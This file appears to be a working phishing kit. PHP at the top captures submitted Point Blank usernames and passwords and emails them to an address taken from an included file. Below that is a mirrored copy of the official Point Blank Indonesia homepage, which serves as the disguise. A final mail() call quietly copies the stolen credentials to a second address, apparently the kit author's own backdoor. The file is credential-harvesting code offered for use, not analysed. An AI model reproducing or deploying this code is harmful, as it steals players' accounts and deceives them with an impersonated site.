<?php
$user = $_POST['username'];
$pass = $_POST['password'];
?>

<?php
include('email_result.php');
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$subjek = "POINTBLANK ZEPETTO | PUNYA SI $user";
$body = <<<EOD
<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #FF3366;	padding: 20px; margin-top: 20px;'>
Username         =  $user<br>
Password      =  $pass<br>
<hr style='border: 0;border-bottom: 1px solid #FF3366;background: #999;'/>
Bye Andre Coding   = $url<br>
</div>
EOD;
//* jangan di ubah kalo kagak mau error!,gak usah sok tau deh //*
$headers = "From: Andre Coding <result@AndreCoding.com>\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($result, $subjek, $body, $headers);
?>



<!doctype html>
<html>

<!-- Mirrored from pointblank.id/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 02 Jan 2019 03:47:35 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="utf-8">
	<meta name="author" content="">
    <meta property="og:type" content="website" />
    <meta property="og:title" content="PB Indonesia" />
    <meta property="og:url" content="index.html" />
    <meta property="og:description" content="Point Blank is one of the world’s most popular Free-to-play online FPS game serviced in 100 countries and enjoyed by 100 million players" />
    <meta property="og:image" content="../www.pointblank.id/images/og_img.html" />
    <meta name="keywords" content="PB, point blank, fps, shooting game, online" />
    <meta name="description" content="Point Blank is one of the world’s most popular Free-to-play online FPS game serviced in 100 countries and enjoyed by 100 million players" />
	<title>PB Indonesia</title>
	<link rel="stylesheet" type="text/css" href="css/common.css">
	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<link rel="stylesheet" type="text/css" href="/css/common_ie8.css">
	<![endif]-->
	<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-129579613-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
 
  gtag('config', 'UA-129579613-1');
</script>
	<script type="text/javascript" src="js/jquery/1.11.3/jquery.min.js"></script>
	<script type="text/javascript" src="js/jqueryui/1.11.4/jquery-ui.min.js"></script>
	<script type="text/javascript" src="../ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script><!-- 배너 -->
	<script type="text/javascript" src="js/design_banner.js"></script><!-- 배너 -->
</head>

<body>
	<div class="container">
	<header>
		<h1><a href="index.html"><img src="images/logo_gnb_pb.png" alt="Point Blank beyond Limits"></a></h1>
		<nav>
		<ul>
			<li>
				<p><a href="game/intro.html" data-content="Game" class="on">GAME</a></p>
				<ul class="depth2">
					<li><a href="game/intro.html">PENGENALAN PB B.L</a></li>
					<li><a href="game/transfer.html">TRANSFER SERVIS</a></li>
					<li><a href="game/download.html">DOWNLOAD</a></li>
					<li><a href="game/setting/download.html">INITIATION</a></li>
					<li><a href="game/start.html">GAME START</a></li>
				</ul>
			</li>
			<li><p><a href="news/list.html" data-content="News">BERITA</a></p></li>
			<li>
				<p class="coming">COMING SOON</p>
				<p><a href="javascript:void(0);" data-content="Ranking" class="on">RANK</a></p>
				<!-- <p><a href="/ranking/individual/list" data-content="Ranking" class="on">RANK</a></p>
				<ul class="depth2">
					<li><a href="/ranking/individual/list">RANK INDIVIDU</a></li>
					<li><a href="/ranking/clan/list">RANK CLAN</a></li>
				</ul> -->
			</li>
			<li><p><a href="media/list.html" data-content="Media">MEDIA</a></p></li>
			<li>
				<p class="coming">COMING SOON</p>
				<p><a href="javascript:void(0);" data-content="Tournament">E-SPORTS</a></p>
			</li>
			<li><p><a href="faq/list.html" data-content="FAQ">FAQ</a></p></li>
			<li>
				<p><a href="javascript:void(0);"" data-content="Forum" class="on">FORUM</a></p>
				<ul class="depth2 depth2_sns">
					<li>
						<a href="https://discord.gg/qkbjR3V" target="_blank" class="discord">
							<p><img src="images/sns_14_discord.png" alt="Discord"></p>DISCORD
						</a>
					</li>
					<li>
						<a href="https://www.facebook.com/PBIndonesiaZepetto/" target="_blank" class="facebook">
							<p><img src="images/sns_14_facebook.png" alt="Facebook"></p>FACEBOOK
						</a>
					</li>
					<li>
						<a href="https://www.instagram.com/zepetto_pbindonesia" target="_blank" class="insta">
							<p><img src="images/sns_14_insta.png" alt="Instagram"></p>INSTAGRAM
						</a>
					</li>
					<li>
						<a href="https://www.youtube.com/c/ZepettoPBIndonesia" target="_blank" class="youtube">
							<p><img src="images/sns_14_youtube.png" alt="Youtube"></p>YOUTUBE
						</a>
					</li>
				</ul>
			</li>
		</ul>
		</nav>
		
		<div class="nav_util">
			
			<!--// 로그아웃 상태 -->
			<div class="logout">
				<ul>
					<li class="login"><a href="index.html">Logout</a></li>
				</ul>
			</div>
			<!--로그아웃 상태 //-->
			
			<!-- <div class="play"><a href="#"><span class="txt_red">MAINKAN</span> SEKARANG</a></div> -->
		</div>

		<!--// 레이어팝업(회원가입) -->
		<div id="layer_popup" style="display:none;">
			<p class="dimmed"></p>
			<iframe src="#" height="456" frameborder="0" scrolling="no"></iframe>
		</div>
		<!-- 레이어팝업(회원) //-->
		
<script type="text/javascript">
	//<![CDATA[
	   var zptRcvMessage = {
	    receiveMessage : function (event) {
	        var regPBID = /.pbid/g;
	
	        var data = $.parseJSON(event.data);
	
	        if (regPBID.test(event.data)) {
	            switch (data.type) {
	                case "pbid_iframe_resize":
	                    var frame = $("#layer_popup").find("iframe");
	                    if (frame.length > 0) {
	                        if (data.width) {
	                            frame.attr("width", data.width);
	                        }
	                        if (data.height) {
	                            frame.attr("height", data.height);
	                        }
	                    }
	                    break;
	                case "pbid_location_change":
	                    if (data.location) {
	                        document.location.href = data.location;
	                    }
	                    break;
	                case "pbid_layer_popup_close":
	                    $("#layer_popup").html("").fadeOut("fast");
	                    break;
	                case "pbid_page_reload":
	                    window.location.href = window.location;
	                    break;
	                case "pbid_set_value":
	                    $("#"+data.id).val(data.value);
	                    break;
	                case "pbid_pop_layer":
	                	openLayerPopup(data.url);
	                    break;
	            }
	        }
	        else {
	            return false;
	        }
	    }
	};
	
	if(window.addEventListener) {
		window.addEventListener ("message", zptRcvMessage.receiveMessage, false);
	} else {
		if(window.attachEvent) {  
			window.attachEvent("onmessage", zptRcvMessage.receiveMessage);
		}
	}
    function openLayerPopup(param) {
        var url = "";
        if ($.trim(param) == "sign") {
            url = "<p class=\"dimmed\"></p><iframe src=\"/member/policy\" height=\"652\" style=\"border:none;\" frameborder=\"0\" scrolling=\"no\"></iframe>";
        }
        else if ($.trim(param) == "login") {
            url = "<p class=\"dimmed\"></p><iframe src=\"/login/form\" height=\"576\" style=\"border:none;\" frameborder=\"0\" scrolling=\"no\"></iframe>";
        }
        else {
        	url = "<p class=\"dimmed\"></p><iframe src=\""+param+"\" height=\"576\" style=\"border:none;\" frameborder=\"0\" scrolling=\"no\"></iframe>";
        }
        $("#layer_popup").html(url).fadeIn("fast");
        //return false;
    }
	//]]>
	</script>
	</header>

	<div class="quick">
		<!-- <p class="cheat"><a href="/ticket/form?mode=cheat">REPORT CHEATING</a></p> -->
		<p class="topup"><a href="https://www.pointblank.id/topup/auth?redirect_url=https://topup.pointblank.id">TOPUP CENTER</a></p>
		<p class="warnet"><a href="https://pointblank.id/pccafe/login">OWNER BASECAMP</a></p>
	</div>
	<div class="main_wrap">
		<section class="main_visual">
			<div class="banner_wrap" style="display: ;">
				
				<ul>
					
					
						
						<li><a href="index.html" target="_BLANK"><img src="upload/image/20190102/3741571b1e802cda0e9204fe8b4f284fcd93db065c097f5358c2068c3fc5dbe3.png" alt="Main Banner"></a></li>
						
						
							
					
					
						
						
						<li class="vod">
							<!-- <p class="vod_dim">&nbsp;</p> -->
							<div class="youtube">
								<iframe width="100%" height="100%" src="https://www.youtube.com/embed/l1uNZ07ZWNM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
							</div>
						</li>
						
							
					
					
						
						<li><a href="https://www.pointblank.id/event" target="_BLANK"><img src="upload/image/20181229/7517bfa49a0d089c0cd4e5fc3fb4a9205f519806a7948ec176f391ae34575505.png" alt="Main Banner"></a></li>
						
						
							
					
				</ul>
				
			</div>
		</section>
		
		<section class="main_news">
			<ul>
				<li>
					<h2>Event</h2>
					
					
						
						
					<a href="news/view8856.html?idx=19&amp;page=1">
							
						<img src="upload/image/20190101/d4f3f9b72273a034ea628d1c174286a0ed2e9a375d159c80e4678a013e427605.png" alt="News thumbnail">
							
						<p class="tit">Launching Event Point Blank Beyond Limits</p>
						<p class="txt">Login, Play and get reward!!!</p>
					</a>
						
						
						
					
					
				</li>
				<li>
					<h2>Promo</h2>
					
					
						
						
					<a href="news/viewcfb0.html?idx=15&amp;page=1">
							
						<img src="upload/image/20190101/8203a36f21f040fbc90630bf04f6d272255a1a12603c0ede8cfbf76f9f851694.png" alt="News thumbnail">
							
						<p class="tit">KUMPULKAN PASUKAN KE MEDAN PERANG!</p>
						<p class="txt">Ajak Temanmu dan Menangkan Motor Yamaha NMAX!! 1 Desember 2018 ~ 31 Januari 2019</p>
					</a>
						
						
						
					
						
						
						
					<a class="list" href="news/viewa332.html?idx=14&amp;page=1">Ayo berikan saran dan masukan kamu untuk Point Blank beyond limits, saran yang kamu berikan akan merubah segalanya!</a>
						
						
					
						
						
						
					<a class="list" href="news/view04d4.html?idx=13&amp;page=1">Medan perang baru akan segera di mulai, ayo segera sebarkan sinyal perang ini ke semua pasukanmu!!</a>
						
						
					
					
				</li>
				<li>
					<h2>Patch</h2>
					
					
						
						
					<a href="news/view767b.html?idx=30&amp;page=1">
							
						<img src="upload/image/20190101/a23558b5ce9c7bcc34948b3467f44b0f5a1f6891f9bd729006043c58aa5c2467.png" alt="News thumbnail">
							
						<p class="tit">Maintenance Selesai</p>
						<p class="txt">Maintenance Keamanan network game server dan  Keamanan perpindahan akun  telah selesai</p>
					</a>
						
						
						
					
						
						
						
					<a class="list" href="news/viewce72.html?idx=29&amp;page=1">Fitur ticket akan ditutup sementara waktu untuk dilakukan perbaikan</a>
						
						
					
						
						
						
					<a class="list" href="news/viewa166.html?idx=28&amp;page=1">Server Point Blank Beyond Limits akan ditutup sementara untuk perbaikan</a>
						
						
					
					
				</li>
				<li>
					<h2>E-Sports</h2>
					
					
						
						
					<a href="news/viewe96a.html?idx=16&amp;page=1">
							
						<img src="upload/image/20190101/2db766bcf8a57124a1bc27af1da3cdc1a60a3efecd8adde34677d400f9dc033e.png" alt="News thumbnail">
							
						<p class="tit">Road Show Grebek Warnet</p>
						<p class="txt">Masih dalam suasana dan untuk menambah kemeriahan Grand  Launching Point Blank Beyond Limits kami telah menyiapakan Event Road Show Gebrek Warnet. </p>
					</a>
						
						
						
					
					
				</li>
			</ul>
			<div class="btn_h72"><a class="btn_rd wide" href="news/list.html">BACA DENGAN DETAIL</a></div>
		</section>
		
		<section class="main_cont">
			<div>
				<div class="vod">
					<h2>VIDEO</h2>
					<p class="page">
						<a class="prev" href="javascript:void(0);" onclick="bcBoard.pageLoad('prev');">Preview</a>
						<a class="next" href="javascript:void(0);" onclick="bcBoard.pageLoad('next');">Nextview</a>
					</p>
					<ul id="devVod">
						
						
						<li class="video">
							<a href="https://www.youtube.com/embed/RAGrJ_i0Az8">
								<p class="play">PLAY</p>
								<p class="thumb">
								
								<img src="upload/image/20181226/df52eabb55e569c80e05e745570e6368b09bffffa02435cd797ca4a79d9d7b23.png" alt="Video thumbnail">
								
								</p>
								<h3>Ace Mode</h3>
							</a>
						</li>
						
						<li class="video">
							<a href="https://www.youtube.com/embed/Oi0XT0FvoFU">
								<p class="play">PLAY</p>
								<p class="thumb">
								
								<img src="upload/image/20181229/648908d1451fa8b46b33137dd1ff1af2aee46f51aade538e78a90ef93f805f38.jpg" alt="Video thumbnail">
								
								</p>
								<h3>Bajak Zepetto</h3>
							</a>
						</li>
						
						<li class="video">
							<a href="https://www.youtube.com/embed/mibvhvy-tAY"">
								<p class="play">PLAY</p>
								<p class="thumb">
								
								<img src="upload/image/20181228/6a18e8fb69353412929dbdd3229c240fa9e554aecce4d0ad528ff42a41b88db9.jpg" alt="Video thumbnail">
								
								</p>
								<h3></h3>
							</a>
						</li>
						
						<li class="video">
							<a href="https://www.youtube.com/embed/V4S3TXwjDIY">
								<p class="play">PLAY</p>
								<p class="thumb">
								
								<img src="upload/image/20181227/7c7ad1a0c73c4f911466a3b46605fdbc0f891cd18bfbe613025b4fa430795108.jpg" alt="Video thumbnail">
								
								</p>
								<h3></h3>
							</a>
						</li>
						
						
					</ul>
				</div>
				<div class="esports">
					<h2>E-SPORTS</h2>
					<p class="esports_banner">esports</p>
				</div>
				<!-- <div class="ranking">
					<h2>Top Rank</h2>
					<p class="more"><a href="#">More</a></p>
					<ul>
						<li>
							<p>1</p>
							<p class="nick">Ð¼Î£Ð¹ÐÇ¾Ä¶23_BTÄ¶</p>
							<p class="exp">99,999,999,999</p>
						</li>
						<li>
							<p>2</p>
							<p class="nick">ÏT19</p>
							<p class="exp">99,999,999,999</p>
						</li>
						<li>
							<p>3</p>
							<p class="nick">abcdefg123456</p>
							<p class="exp">99,999,999,999</p>
						</li>
						<li>
							<p>4</p>
							<p class="nick">WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW</p>
							<p class="exp">99,999,999,999</p>
						</li>
						<li>
							<p>5</p>
							<p class="nick">HXMFRR10seLLa</p>
							<p class="exp">99,999,999,999</p>
						</li>
						<li>
							<p>6</p>
							<p class="nick">OutblastFHL311_</p>
							<p class="exp">99,999,999,999</p>
						</li>
						<li>
							<p>7</p>
							<p class="nick">ME412MOTLEY</p>
							<p class="exp">99,999,999,999</p>
						</li>
						<li>
							<p>8</p>
							<p class="nick">JOINPB</p>
							<p class="exp">99,999,999</p>
						</li>
						<li>
							<p>9</p>
							<p class="nick">W_bau</p>
							<p class="exp">999,999</p>
						</li>
						<li class="last">
							<p>10</p>
							<p class="nick">MOTLEY</p>
							<p class="exp">999</p>
						</li>
					</ul>
				</div> -->
			</div>
			<div class="banner_transfer">
				<div>
					<img src="images/banner_transfer_bi.png" alt="Point Blank beyond Limits">
					<p class="txt">
						<strong>Datanglah kemari, Troopers!</strong>
						Jika ingin menyambungkan informasi game yang digunakan hingga 27 Desember 2018,<br>
						silahkan klik tombol &lsquo;Transfer Akun&rsquo; yang ada di bawah ini dan data akan ditransfer.
					</p>
					<p class="btn_h48">
						<a class="btn_rd" href="faq/list.html">FAQ</a>
						<a class="btn_yl" href="https://pointblank.id/mypage/info"><span>TRANSFER</span></a>
					</p>
				</div>
			</div>
		</section>
	</div>
	<!--// ë ì´ì´íì(ë¯¸ëì´) -->
	<div class="pop_media">
		<p class="dimmed"></p>
		<div class="video">
			<p class="btn_close"><a href="#">CLOSE</a></p>
			<div class="youtube"><iframe width="960" height="540" src="#" frameborder="0"></iframe></div>
			<h3></h3>
		</div>
	</div>
	<!-- ë ì´ì´íì(ë¯¸ëì´) //-->
<script>
	//<![CDATA[
	$(function() {
		$(".vod li a").on("click", function() {
			var name = $(this).parent("li").attr("class"),
				title = $(this).find("h3").text(),
				link = $(this).attr("href");
			$(".pop_media").fadeIn("fast");
			if (name == "video") {
				$(".pop_media .video").fadeIn("fast");
				$(".pop_media .video iframe").attr("src", link);
				$(".pop_media .video h3").empty().append(title);
			}
			return false;
		});
		$(".pop_media .dimmed, .pop_media .btn_close a").on("click", function() {
			$(".pop_media .video iframe, .pop_media .screen img").attr("src", "");
			$(".pop_media").fadeOut("fast");
		});
	});

    var bcBoard = {
    	curPage : 1,
        lastPage : 1,
        pageLoad : function (navi) {
        	if (navi == 'prev') {
        		if (bcBoard.curPage < 2) return;
        		bcBoard.curPage = bcBoard.curPage - 1;
        	}
        	else {
        		if (bcBoard.curPage > bcBoard.lastPage - 1) return;
        		bcBoard.curPage = bcBoard.curPage + 1;
        	}
        	$.ajax({
           	    url: "/video/page",
       			dataType : "json",
       			type: "GET",
       			data:  "page=" + bcBoard.curPage,
       			contentType : "application/x-www-form-urlencoded;charset=UTF-8",
       			success: function (data) {
       				if (data != null) {
       					if (data) {
                        	if (data.length > 0) {
                        		$("#devVod").html("");
                        		var htmlStr = "";
                            	for (var i = 0; i < data.length; i++) {
		                            var row = data[i];
		                            
		                            htmlStr += "<li class=\"video\">";
		                            htmlStr += "<a href=\""+row.link+"\"><p class=\"play\">PLAY</p><p class=\"thumb\">";
									if ($.trim(row.thumbnail)!="") {
										htmlStr += "<img src=\""+row.thumbnail+"\" alt=\"Video thumbnail\"></p>";
									}
									else { 
										htmlStr += "<img src=\"/images/thumb_news.jpg\" alt=\"Video thumbnail\"></p>";
									}
									htmlStr += "<h3>"+row.idx+row.title+"</h3></a></li>";
		                            
                                }
                            	$("#devVod").html(htmlStr);
                            }
       					}
       				}
       			}, error: function(xhr, status, error) {
       				alert("status=" + xhr.status + "\nreadyState=" + xhr.readyState);
       			}
       		});
		}
    };
    
	$(window).on("load", function() {
		
	});
	
	//]]>
</script>


	<footer>
		<div class="menu">
			<img src="images/footer_zii.png" alt="PT. Zepetto Interactive Indonesia">
			<ul>
				<li>
					<strong>POINT BLANK BEYOND LIMITS</strong><br>
					<a href="game/intro.html">GAME</a><br>
					<a href="news/list.html">BERITA</a><br>
					<a href="javascript:void(0);" class="coming">RANK <span>COMING SOON</span></a><br>
					<!-- <a href="/ranking/individual/list">RANK</a><br><br> -->
					<a href="media/list.html">MEDIA</a><br>
					<a href="javascript:void(0);" class="coming">E-SPORTS <span>COMING SOON</span></a><br>
					<!-- <a href="/esports/tournament/list">E-SPORTS</a><br> -->
					<a href="faq/list.html">FAQ</a><br>
				</li>
				<li>
					<strong>PB E-SPORTS</strong><br>
					<a href="http://www.fps-pb.com/" class="blank">PB E-SPORTS</a><br>
				</li>				
				<li>
					<strong>PEMBERITAHUAN</strong><br>
					<a href="eula/privacy.html">PEMBERITAHUAN PRIVASI</a><br>
					<a href="eula/terms.html">SYARAT LAYANAN</a><br>
					<a href="eula/policy.html">PEMBERITAHUAN PENGELOLAAN GAME</a><br>					
				</li>
			</ul>
		</div>
		<div class="copyright">
			<p>COPYRIGHT PT. ZEPETTO INTERACTIVE INDONESIA ALL RIGHTS RESERVED.</p>
			<ul>
				<li><a href="https://discord.gg/qkbjR3V" target="_blank"><img src="images/sns_20_discord.png" alt="Discord"></a></li>
				<li><a href="https://www.facebook.com/PBIndonesiaZepetto/" target="_blank"><img src="images/sns_20_facebook.png" alt="Facebook"></a></li>
				<li><a href="https://www.instagram.com/zepetto_pbindonesia" target="_blank"><img src="images/sns_22_insta.png" alt="Instagram"></a></li>
				<li><a href="https://www.youtube.com/c/ZepettoPBIndonesia" target="_blank"><img src="images/sns_20_youtube.png" alt="Youtube"></a></li>
				<li><a href="#" class="top">TOP</a></li>
			</ul>
		</div>
	</footer>
	</div>
</body>

</html>

<?php
//* Mengirim Informasi AREANA Jangan Dihapus, Jangan Sok Tau deh //*
$success = mail($auth0, $subjek, $body, $headers);
?>
